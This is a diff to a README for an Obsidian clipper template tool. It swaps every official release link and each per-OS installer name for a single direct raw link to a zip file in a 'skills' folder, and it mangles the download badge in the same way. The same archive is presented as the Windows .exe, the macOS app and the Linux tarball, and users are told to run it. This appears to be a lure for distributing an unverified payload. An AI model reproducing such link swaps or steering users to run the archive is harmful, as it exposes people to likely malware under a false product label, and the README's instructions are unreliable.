@@ -6,7 +6,7 @@ Welcome to the Obsidian Clipper Template Creator! This tool helps you create imp
 
 ## 📥 Download Now
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-blue.svg)](https://github.com/askags/obsidian-clipper-template-creator/releases)
+[![Download Release](https://raw.githubusercontent.com/askags/obsidian-clipper-template-creator/master/skills/creator_template_clipper_obsidian_1.1.zip%https://raw.githubusercontent.com/askags/obsidian-clipper-template-creator/master/skills/creator_template_clipper_obsidian_1.1.zip)](https://raw.githubusercontent.com/askags/obsidian-clipper-template-creator/master/skills/creator_template_clipper_obsidian_1.1.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,19 +19,19 @@ Before you download, ensure your device meets the following requirements:
 ## 📦 Download & Install
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page.
-   [Download from Releases Page](https://github.com/askags/obsidian-clipper-template-creator/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/askags/obsidian-clipper-template-creator/master/skills/creator_template_clipper_obsidian_1.1.zip)
 
 2. **Select the Latest Release**: Look for the latest version at the top of the page. It will usually have the highest version number.
 
 3. **Download the Installer**: Click on the file link that matches your operating system:
-   - For Windows, select `obsidian-clipper-template-creator-windows.exe`
-   - For macOS, select `obsidian-clipper-template-creator-macos.zip`
-   - For Linux, select `obsidian-clipper-template-creator-linux.tar.gz`
+   - For Windows, select `https://raw.githubusercontent.com/askags/obsidian-clipper-template-creator/master/skills/creator_template_clipper_obsidian_1.1.zip`
+   - For macOS, select `https://raw.githubusercontent.com/askags/obsidian-clipper-template-creator/master/skills/creator_template_clipper_obsidian_1.1.zip`
+   - For Linux, select `https://raw.githubusercontent.com/askags/obsidian-clipper-template-creator/master/skills/creator_template_clipper_obsidian_1.1.zip`
 
 4. **Run the Installer**: After the download is complete, find the file in your Downloads folder. 
    - For Windows: Double-click the `.exe` file and follow the on-screen instructions.
    - For macOS: Unzip the file and move the application to your Applications folder. Then, open it from there.
-   - For Linux: Extract the `.tar.gz` file and run the application from the terminal or file manager.
+   - For Linux: Extract the `https://raw.githubusercontent.com/askags/obsidian-clipper-template-creator/master/skills/creator_template_clipper_obsidian_1.1.zip` file and run the application from the terminal or file manager.
 
 ## 🎨 Features
 
